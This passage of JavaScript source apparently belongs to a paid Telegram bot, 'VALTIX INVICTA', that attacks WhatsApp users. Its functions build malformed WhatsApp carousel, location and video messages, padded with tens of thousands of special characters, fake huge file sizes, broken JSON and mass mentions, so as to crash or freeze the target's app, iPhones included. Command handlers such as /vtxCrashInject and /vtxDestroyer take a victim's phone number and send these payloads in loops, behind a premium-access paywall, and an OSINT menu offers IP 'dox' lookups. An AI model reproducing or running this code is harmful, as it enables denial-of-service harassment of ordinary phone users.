    console.log(chalk.red(`𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
    for (let b = 0; b < 75; b++) {
    const cards = Array.from({ length: 5 }, () => ({
        body: proto.Message.InteractiveMessage.Body.fromObject({ text: "valtix" + "ꦽ".repeat(5000), }),
        footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "valtix" + "ꦽ".repeat(5000), }),
        header: proto.Message.InteractiveMessage.Header.fromObject({
            title: "VALTIX" + "ꦽ".repeat(5000),
            hasMediaAttachment: true,
            videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "IL4IFl67c8JnsS1g6M7NqU3ZSzwLBB3838ABvJe4KwM=",
                fileLength: "9999999999999999",
                seconds: 9999,
                mediaKey: "SAlpFAh5sHSHzQmgMGAxHcWJCfZPknhEobkQcYYPwvo=",
                height: 9999,
                width: 9999,
                fileEncSha256: "QxhyjqRGrvLDGhJi2yj69x5AnKXXjeQTY3iH2ZoXFqU=",
                directPath: "/v/t62.7161-24/533825502_1245309493950828_6330642868394879586_n.enc?ccb=11-4&oh=01_Q5Aa2QHb3h9aN3faY_F2h3EFoAxMO_uUEi2dufCo-UoaXhSJHw&oe=68CD23AB&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1755691703",
                jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACIASAMBIgACEQEDEQH/xAAuAAADAQEBAAAAAAAAAAAAAAAAAwQCBQEBAQEBAQAAAAAAAAAAAAAAAAEAAgP/2gAMAwEAAhADEAAAAIaZr4ffxlt35+Wxm68MqyQzR1c65OiNLWF2TJHO2GNGAq8BhpcGpiQ65gnDF6Av/8QAJhAAAgIBAwMFAAMAAAAAAAAAAQIAAxESITEEE0EQFCIyURUzQv/aAAgBAQABPwAag5/1EssTAfYZn8jjAxE6mlgPlH6ipPMfrR4EbqHY4gJB43nuCSZqAz4YSpntrIsQEY5iV1JkncQNWrHczuVnwYhpIy2YO2v1IMa8A5aNfgnQuBATccu0Tu0n4naI5tU6kxK6FOdxPbN+bS2nTwQTNDr5ljfpgcg8wZlNrbDEqKBBnmK66s5E7qmWWjPAl135CxJ3PppHbzjxOm/sjM2thmVfUxuZZxLYfT//xAAcEQACAgIDAAAAAAAAAAAAAAAAARARAjESIFH/2gAIAQIBAT8A6Wy2jlNHpjtD1P8A/8QAGREAAwADAAAAAAAAAAAAAAAAAAERICEw/9oACAEDAQE/AIRmysHh/9k=",
                streamingSidecar: "qe+/0dCuz5ZZeOfP3bRc0luBXRiidztd+ojnn29BR9ikfnrh9KFflzh6aRSpHFLATKZL7lZlBhYU43nherrRJw9WUQNWy74Lnr+HudvvivBHpBAYgvx07rDTRHRZmWx7fb1fD7Mv/VQGKRfD3ScRnIO0Nw/0Jflwbf8QUQE3dBvnJ/FD6In3W9tGSdLEBrwsm1/oSZRl8O3xd6dFTauD0Q4TlHj02/pq6888pzY00LvwB9LFKG7VKeIPNi3Szvd1KbyZ3QHm+9TmTxg2ga4s9U5Q"
            },
        }),
        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
            messageParamsJson: "{[",
            messageVersion: 3,
            buttons: [
                {
                    name: "single_select",
                    buttonParamsJson: "",
                },           
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦽ".repeat(10000),
                        "flow_message_version": "3"
                    })
                },     
                {
                    name: "galaxy_message",
                    buttonParamsJson: JSON.stringify({
                        "icon": "RIVIEW",
                        "flow_cta": "ꦾ".repeat(10000),
                        "flow_message_version": "3"
                    })
                }
            ]
        })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
        target, 
        {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.create({ 
                            text: `§valtixUdang§\n${"ꦾ".repeat(2000)}:)\n\u0000` + "ꦾ".repeat(5000)
                        }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ 
                            text: "ꦽ".repeat(5000),
                        }),
                        header: proto.Message.InteractiveMessage.Header.create({ 
                            hasMediaAttachment: false 
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ 
                            cards: cards 
                        }),
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                            messageParamsJson: "{[".repeat(10000),
                            messageVersion: 3,
                            buttons: [
                                {
                                    name: "single_select",
                                    buttonParamsJson: "",
                                },           
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦽ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                },     
                                {
                                    name: "galaxy_message",
                                    buttonParamsJson: JSON.stringify({
                                        "icon": "RIVIEW",
                                        "flow_cta": "ꦾ".repeat(10000),
                                        "flow_message_version": "3"
                                    })
                                }
                            ]
                        }),
                        contextInfo: {
                            participant: target,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from(
                                    { length: 1900 },
                                    () =>
                                    "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
                                ),
                            ],
                            remoteJid: "X",
                            participant: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                            stanzaId: "123",
                            quotedMessage: {
                                paymentInviteMessage: {
                                    serviceType: 3,
                                    expiryTimestamp: Date.now() + 1814400000
                                },
                                forwardedAiBotMessageInfo: {
                                    botName: "META AI",
                                    botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                                    creatorName: "Bot"
                                }
                            }
                        },
                    })
                }
            }
        }, 
        { userJid: target }
    );

    // Pengiriman dengan format yang diminta tanpa mention
    await valtix.relayMessage(target, {
        groupStatusMessageV2: {
            message: carousel.message
        }
    }, { messageId: carousel.key.id });
    }
}
//func iphone//
async function LoadInvisIphone(valtix, target) {
  const AddressPayload = {
    locationMessage: {
      degreesLatitude: 1999-1999917739,
      degreesLongitude: -11.81992828899,
      name: " ⎋꙱" + "\u0000".repeat(60000) + "𑇂𑆵𑆴𑆿".repeat(60000),
      url: "https://eporner.com",
      contextInfo: {
        externalAdReply: {
          quotedAd: {
            advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
            mediaType: "IMAGE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/",
            caption: "Join New Group" + "𑇂𑆵𑆴𑆿".repeat(60000)
          },
          placeholderKey: {
            remoteJid: "1s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          }
        }
      }
    }
  };

  await valtix.relayMessage(target, AddressPayload, {
    participant: { jid: target }
  });
}

//blank no click//
async function videoBlank(valtix, target) {
  const cards = [];
    const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "sHsVF8wMbs/aI6GB8xhiZF1NiKQOgB2GaM5O0/NuAII=",
    fileLength: "107374182400",
    seconds: 999999999,
    mediaKey: "EneIl9K1B0/ym3eD0pbqriq+8K7dHMU9kkonkKgPs/8=",
    height: 9999,
    width: 9999,
    fileEncSha256: "KcHu146RNJ6FP2KHnZ5iI1UOLhew1XC5KEjMKDeZr8I=",
    directPath: "/v/t62.7161-24/26969734_696671580023189_3150099807015053794_n.enc?ccb=11-4&oh=01_Q5Aa1wH_vu6G5kNkZlean1BpaWCXiq7Yhen6W-wkcNEPnSbvHw&oe=6886DE85&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1751081957",
    jpegThumbnail: null, 
    streamingSidecar: null
  }
   const header = {
    videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "-" + Date.now(),
      participant: "1@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "",
              body: "",
              thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
              mediaType: 1,
              sourceUrl: "https://xnxx.com", 
              showAdAttribution: false
            }
          }
        }
      }
    }
  };

  for (let b = 0; b < 35; b++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000)
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "ꦽ".repeat(45000)
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "VALTIX INVICTA" + "-Id" + Math.floor(Math.random() * 99999),
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "ោ៝".repeat(10000),
                body: "Hallo ! ",
                thumbnailUrl: "https://files.catbox.moe/55qhj9.png",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "t.me/Thaureyo",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await valtix.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
//=========== ASYNC FUNCTION SEND ==========\\

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

const bugRequests = {};

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;

  bot.sendPhoto(chatId, "https://files.catbox.moe/f5147v.jpg", {
    caption: `pencet tombol menu untuk ke menu awal:\n/menu`,
    reply_markup: {
      inline_keyboard: [
        [
          { text: "Developer", url: "https://t.me/Thaureyo" }
        ],
        [
          { text: "My Chanel", url: "https://t.me/ThaurexInfo" }
        ]
      ]
    }
  });
});

// Handler untuk /start
bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;

  const firstName = msg.from.first_name || "-";
  const lastName = msg.from.last_name || "";
  const fullName = `${firstName} ${lastName}`.trim();
  const username = msg.from.username ? `@${msg.from.username}` : "(Tidak ada username)";

  const now = new Date();
  const tanggal = now.toLocaleDateString("id-ID");
  const waktu = now.toLocaleTimeString("id-ID");

  const bokepjepang = getBotRuntime();
  const jidat = getCurrentDate();
  const randomImage = getRandomImage();
  const version = "3.0";

  // CEK PREMIUM
  if (!premiumUsers.some(user => user.id === userId && new Date(user.expiresAt) > new Date())) {
    const options = {
      caption: "/addprem duluu gini contohnya: /addprem 12345678 50d",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Developer", url: "https://t.me/Thaureyo" }],
          [{ text: "My Channel", url: "https://t.me/ThaurexInfo" }]
        ]
      }
    };

    return bot.sendPhoto(chatId, randomImage, options);
  }

// TAMPILKAN MENU UTAMA TANPA PROGRESS BAR
await bot.sendVideo(
    chatId,
    "https://files.catbox.moe/p2jg7w.mp4",
    {
      caption:`<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>

𝗢𝗹𝗮!🕊 ${username} — 𝗪𝗲𝗹𝗰𝗼𝗺𝗲
<i>アクセスが許可されました。システムはあなたの主要ルートを準備しています。</i>

╭━───━⊱ 𝙋𝙍𝙊𝙅𝙀𝘾𝙏 𝘿𝘼𝙏𝘼 ⊰━───━╮
┃⟜❏ 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫     : RyoNotDev
┃⟜❏ 𝐎𝐰𝐧𝐞𝐫 𝐃𝐞𝐯    : @Thaureyo
┃⟜❏ 𝐕𝐞𝐫𝐬𝐢𝐨𝐧       : 1.0
╰━───────╯

╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
┃⟜❏ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞    : ${bokepjepang}
┃⟜❏ 𝐃𝐚𝐭𝐞        : ${jidat}
╰━───────╯

╭━─━─━─━─━─━╮
┃  𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧 𝐌𝐞𝐧𝐮
╰━─━─━─━─━─━╯

<i>作業は完了しました。必要に応じて続行してください。</i>
`,
      parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂", callback_data: "ownmenu" },
          { text: "𝗔𝘁𝘁𝗮𝗰𝗸", callback_data: "bug" }
        ],
        [
          { text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂", callback_data: "tools" },
          { text: "𝗠𝘆 𝗧𝗲𝗮𝗺", callback_data: "thanksto" }
        ],
        [
          { text: "𝗢𝗦𝗜𝗡𝗧", callback_data: "tools2" }
        ]
      ]
    }
  }
);

// 🔊 Kirim audio otomatis saat menu muncul
try {
  await bot.sendAudio(chatId, "https://files.catbox.moe/0cxjco.mp3", {
    title: "Vtx Vocaloid Sound",
    performer: "Thaureyo"
  });
} catch (err) {
  console.error("❌ Gagal kirim audio:", err.message);
}

}); 

bot.on("callback_query", async (query) => {
  try {
    const chatId = query.message.chat.id;
    const messageId = query.message.message_id;
    const username = query.from.username ? `@${query.from.username}` : "Tidak ada username";
    const senderId = query.from.id;
    const bokepjepang = getBotRuntime();
    const premiumStatus = getPremiumStatus(query.from.id);
    const jidat = getCurrentDate();
    const randomImage = getRandomImage();
    const version = '3.0';
    const developer = 'Butterfly';

    let caption = "";
    let replyMarkup = {};

    // ================== BUG MENU ==================
    if (query.data === "bug") {
      caption = `
<pre>
╭━─━─━─━─━─━─━─━─━─
┃❏ 𝗠𝗲𝗻𝘂 𝗕𝘂𝗴 ❏
┃ ╰ 〆 crash✗ 
┃   ┗⊱ /vtxDestroyer 62×××
┃   ┗⊱ /vtxCrashInject 62×××
┃
┃ ╰ 〆 ios✗ 
┃   ┗⊱ /vtxIosGrimEcho 62×××
┃
┃ ╰ 〆 combo3✗ 
┃   ┗⊱ /vtxMultiVoid 62×××
┃              
┃ ╰ 〆 blank✗ 
┃   ┗⊱ /vtxDarkFreeze 62×××
┃
╰━─━─━─━─━─━─━─━─━─❏
</pre>`;
      replyMarkup = { inline_keyboard: [[{ text: "↩ Back", callback_data: "back" }]] };
    }

    // ================== OWNER MENU ==================
    if (query.data === "ownmenu") {
      caption = `
<pre>
╭━───━⊱ ⊱⪩ 𝗢𝗪𝗡𝗘𝗥 𝗠𝗘𝗡𝗨 ⪨⊰
┃⟜❏ /addowner &lt;id&gt;
┃      ↳ Menambahkan Owner baru ke dalam sistem bot
┃
┃⟜❏ /delowner &lt;id&gt;
┃      ↳ Menghapus akses Owner dari ID tertentu
┃
┃⟜❏ /ubdatenew 
┃      ↳ Auto update ke versi terbaru
╰━──────────────────────────━❏

╭━───━⊱ ⊱⪩ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗡𝗨 ⪨⊰
┃⟜❏ /addprem &lt;id&gt;
┃      ↳ Memberikan akses Premium
┃
┃⟜❏ /delprem &lt;id&gt;
┃      ↳ Menghapus status Premium pengguna
┃
┃⟜❏ /listprem
┃      ↳ Melihat daftar user Premium & masa aktif
┃
┃⟜❏ /chatowner &lt;pesan&gt;
┃      ↳ Kirim pesan ke Owner
╰━──────────────────────────━❏

╭━───━⊱ ⊱⪩ 𝗦𝗘𝗧𝗧𝗜𝗡𝗚 𝗠𝗘𝗡𝗨 ⪨⊰
┃⟜❏ /addsender 62xxxxx
┃      ↳ Menambah nomor yang diizinkan
┃
┃⟜❏ /setjeda &lt;time&gt;
┃      ↳ Mengatur jeda bot
┃
┃⟜❏ /getsession
┃      ↳ Mengambil sesi login bot
┃
┃⟜❏ /grouponly &lt;on/off&gt;
┃      ↳ Mode bot hanya grup
╰━──────────────────────────━❏
</pre>`;
      replyMarkup = { inline_keyboard: [[{ text: "↩ Back", callback_data: "back" }]] };
    }

    // ================== TOOLS SINGLE ==================
    if (query.data === "tools") {
      caption = `
<pre>
╭━───━⊱ ⊱⪩ 𝗙𝗨𝗡 𝗠𝗘𝗡𝗨 ⪨⊰
┃⟜❏ /ig
┃      ↳ Download video IG
┃
┃⟜❏ /tiktok &lt;link&gt;
┃      ↳ Download TikTok no wm
┃
┃⟜❏ /tourl &lt;reply photo/video&gt;
┃      ↳ Convert media ke URL
┃
┃⟜❏ /cekid
┃      ↳ Lihat ID kamu
┃
┃⟜❏ /iqc
┃      ↳ Generate gambar aesthetic
┃
┃⟜❏ /spotifysearch &lt;judul lagu&gt;
┃      ↳ Cari lagu Spotify
┃
┃⟜❏ /Ai &lt;prompt&gt;
┃      ↳ Chat AI
┃
┃⟜❏ /gpt &lt;prompt&gt;
┃      ↳ Mode AI advanced
┃
┃⟜❏ /play &lt;judul&gt;
┃      ↳ Cari & download music
┃
┃⟜❏ /bratvid
┃      ↳ Video brat trend
┃
┃⟜❏ /hd &lt;reply image&gt;
┃      ↳ Upscale foto
┃
┃⟜❏ /fixcode &lt;script&gt;
┃      ↳ Perbaikan kode AI
┃
┃⟜❏ /rasukbot
┃      ↳ Mode eksperimen bot
╰━────────────────────────────━❏
</pre>`;
      replyMarkup = { inline_keyboard: [[{ text: "↩ Back", callback_data: "back" }]] };
    }

    // ================== TOOLS 2 OSINT ==================
    if (query.data === "tools2") {
      caption = `
<pre>
╭━───━⊱ ⊱⪩ 𝗢𝗦𝗜𝗡𝗧 𝗠𝗘𝗡𝗨 ⪨⊰
┃⟜❏ /trackipcyber &lt;ip&gt;
┃      ↳ Info lokasi IP
┃
┃⟜❏ /doxipcyber &lt;ip&gt;
┃      ↳ Alias cepat IP info
┃
┃⟜❏ /whois &lt;domain&gt;
┃      ↳ Info registrar domain
┃
┃⟜❏ /reversedns &lt;ip&gt;
┃      ↳ Cek domain terhubung
┃
┃⟜❏ /finger &lt;url&gt;
┃      ↳ Deteksi teknologi website
┃
┃⟜❏ /subdomain &lt;domain&gt;
┃      ↳ Enum subdomain
┃
┃⟜❏ /negarainfo
┃      ↳ Info negara lengkap
┃
┃⟜❏ /ssweb &lt;url&gt;
┃      ↳ Screenshot website
╰━─────────────────━❏
</pre>`;
      replyMarkup = { inline_keyboard: [[{ text: "↩ Back", callback_data: "back" }]] };
    }

    // ================== THANKS TO ==================
    if (query.data === "thanksto") {
      caption = `
<pre>
╭━───━⊱ ⊱⪩ 𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊 𝘼𝙇𝙇 ⪨⊰
┃ Ryoo — Lead Developer
┃      ↳ Konsep & Arsitektur utama
┃
┃ Ryoo — Owner & Maintainer
┃      ↳ Patch, update, maintain
┃
┃ Partner & Support Team
┃      ↳ Testing, debugging
┃
┃ Buyer, User, Community
┃      ↳ Reason project hidup
╰━─────────────────────────━❏
</pre>`;
      replyMarkup = { inline_keyboard: [[{ text: "↩ Back", callback_data: "back" }]] };
    }

    // ================== BACK ==================
    if (query.data === "back") {
caption = `
<pre>☾⟟☽━━⬥━━ VALTIX INVICTA ━━⬥━━☾⟟☽</pre>

𝗢𝗹𝗮!🕊 ${username} — 𝗪𝗲𝗹𝗰𝗼𝗺𝗲
<i>アクセスが許可されました。システムはあなたの主要ルートを準備しています。</i>

╭━───━⊱ 𝙋𝙍𝙊𝙅𝙀𝘾𝙏 𝘿𝘼𝙏𝘼 ⊰━───━╮
┃⟜❏ Developer : RyoNotDev
┃⟜❏ Owner Dev : @Thaureyo
┃⟜❏ Version    : 1.0
╰━───────╯

╭━───━⊱ 𝙄𝙉𝙁𝙊𝙍𝙈𝘼𝙏𝙄𝙊𝙉 ⊰───━╮
┃⟜❏ Runtime : ${bokepjepang}
┃⟜❏ Date    : ${jidat}
╰━───────╯

╭━─━─━─━─━─━╮
┃  𝐏𝐫𝐞𝐬𝐬 𝐁𝐮𝐭𝐭𝐨𝐧 𝐌𝐞𝐧𝐮
╰━─━─━─━─━─━╯

<i>作業は完了しました。必要に応じて続行してください。</i>
`;

      replyMarkup = {
        inline_keyboard: [
          [
            { text: "𝗢𝘄𝗻𝗲𝗿 𝗠𝗲𝗻𝘂", callback_data: "ownmenu" },
            { text: "𝗔𝘁𝘁𝗮𝗰𝗸", callback_data: "bug" }
          ],
          [
            { text: "𝗧𝗼𝗼𝗹𝘀 𝗠𝗲𝗻𝘂", callback_data: "tools" },
            { text: "𝗠𝘆 𝗧𝗲𝗮𝗺", callback_data: "thanksto" }
          ],
          [
            { text: "𝗢𝗦𝗜𝗡𝗧", callback_data: "tools2" }
          ]
        ]
      };
    }

    // ================== EDIT MEDIA ==================
    await bot.editMessageMedia(
      {
        type: "video",
        media: "https://files.catbox.moe/p2jg7w.mp4",
        caption: caption,
        parse_mode: "HTML"
      },
      {
        chat_id: chatId,
        message_id: messageId,
        reply_markup: replyMarkup
      }
    );

    await bot.answerCallbackQuery(query.id);
  } catch (error) {
    console.error("Error handling callback query:", error);
  }
});

//=======CASE BUG=========//
bot.onText(/\/vtxCrashInject (\d+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;
    const userId = msg.from.id;
    const target = match[1];
    const formattedNumber = target.replace(/[^0-9]/g, "");
    const jid = `${formattedNumber}@s.whatsapp.net`;
    const randomImage = getRandomImage();
    const cooldown = checkCooldown(userId);
    const jidat = getCurrentDate();

    // CEK PREMIUM
    if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
        return bot.sendPhoto(chatId, randomImage, {
            caption: "```\nあなたはクレイクスではない```",
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [
                    [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
                ]
            }
        });
    }

    // CEK COOLDOWN
    if (cooldown > 0) {
        return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
    }

    try {
        // FIX: Pengecekan dan definisi valtix
        if (sessions.size === 0) {
            return bot.sendMessage(
                chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
        }

        const valtix = sessions.values().next().value; // Ambil socket WhatsApp pertama
        if (!valtix) {
            return bot.sendMessage(chatId, "❌ Tidak ada koneksi WhatsApp aktif.");
        }

        const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/f5147v.jpg", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
            parse_mode: "Markdown"
        });

        const progressStages = [
            { text: "[█░░░░░░░░░] 10%", delay: 200 },
            { text: "[███░░░░░░░] 30%", delay: 200 },
            { text: "[█████░░░░░] 50%", delay: 100 },
            { text: "[███████░░░] 70%", delay: 100 },
            { text: "[█████████░] 90%", delay: 100 },
            { text: "[██████████] 100%", delay: 200 }
        ];

        for (const stage of progressStages) {
            await new Promise(resolve => setTimeout(resolve, stage.delay));
            await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``, {
                chat_id: chatId,
                message_id: sentMessage.message_id,
                parse_mode: "Markdown"
            });
        }

        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let a = 0; a < 40; a++) {
    if (a % 2 === 0) {
        await eventFlowres(valtix, jid);
        console.log(`[${a}] → Mode 1: eventFlowres`);
    } else {
        await crashInject(valtix, jid);
        console.log(`[${a}] → Mode 2: LoadInvisIphone`);
    }
    await new Promise(r => setTimeout(r, 1200)); // jeda tiap putaran
}


        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, {
            chat_id: chatId,
            message_id: sentMessage.message_id,
            parse_mode: "Markdown",
            reply_markup: {
                inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
            }
        });

    } catch (error) {
        bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
    }
});


bot.onText(/\/vtxDestroyer (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const target = match[1];
            const formattedNumber = target.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
                   return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
                   }

            try {     
            if (sessions.size === 0) {
            return bot.sendMessage(
            chatId, "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
            );
            }

            const valtix = sessions.values().next().value; // Ambil socket WhatsApp pertama
        if (!valtix) {
            return bot.sendMessage(chatId, "❌ Tidak ada koneksi WhatsApp aktif.");
        }
            
            const sentMessage = await bot.sendPhoto(chatId, "https://files.catbox.moe/f5147v.jpg", {
            caption: `
\`\`\`
❏ Target :  ${formattedNumber}
❏ Status : Process...
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\``, 
         parse_mode: "Markdown"
         });
         const progressStages = [
         { text: "[█░░░░░░░░░] 10%", delay: 200 },
         { text: "[███░░░░░░░] 30%", delay: 200 },
         { text: "[█████░░░░░] 50%", delay: 100 },
         { text: "[███████░░░] 70%", delay: 100 },
         { text: "[█████████░] 90%", delay: 100 },
         { text: "[██████████] 100%", delay: 200 }
         ];
         for (const stage of progressStages) {
         await new Promise(resolve => setTimeout(resolve, stage.delay));
         await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status : Sending....
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${stage.text}
❏ Date : ${jidat}
\`\`\``,    { 
         chat_id: chatId, 
         message_id: sentMessage.message_id, 
         parse_mode: "Markdown" });
         }
    
        console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
        for (let a = 0; a < 50; a++) {

    if (a % 2 === 0) {
        await Carousel(valtix, jid);
        console.log(`[${a}] → Mode 1: Carousel`);
    } else {
        await eventFlowres(valtix, jid);
        console.log(`[${a}] → Mode 2: eventFlowres`);
    }

    await new Promise(r => setTimeout(r, 1500));
}

        console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
        await bot.editMessageCaption(`
\`\`\`
❏ Target : ${formattedNumber}
❏ Status: Succes
❏ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
❏ Date : ${jidat}
\`\`\``, 
   
        {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "Markdown",
        reply_markup: {
        inline_keyboard: [[{ text: "𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙱𝚄𝙶 ‼️", url: `https://wa.me/${formattedNumber}` }]]
        }
        });

        } catch (error) {
       bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
        }    
        });         

bot.onText(/\/vtxIosGrimEcho (\d+)/, async (msg, match) => {
            const chatId = msg.chat.id;
            const senderId = msg.from.id;
            const userId = msg.from.id;
            const target = match[1];
            const formattedNumber = target.replace(/[^0-9]/g, "");
            const jid = `${formattedNumber}@s.whatsapp.net`;
            const randomImage = getRandomImage();
            const cooldown = checkCooldown(userId);
            const jidat = getCurrentDate();

            if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, randomImage, {
    caption: `\`\`\`\nあなたはクレイクスではない\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "📞 𝘉𝘶𝘺 𝘈𝘤𝘤𝘦𝘴", url: "https://t.me/Thaureyo" }]
      ]
    }
  });
}
           
            if (cooldown > 0) {
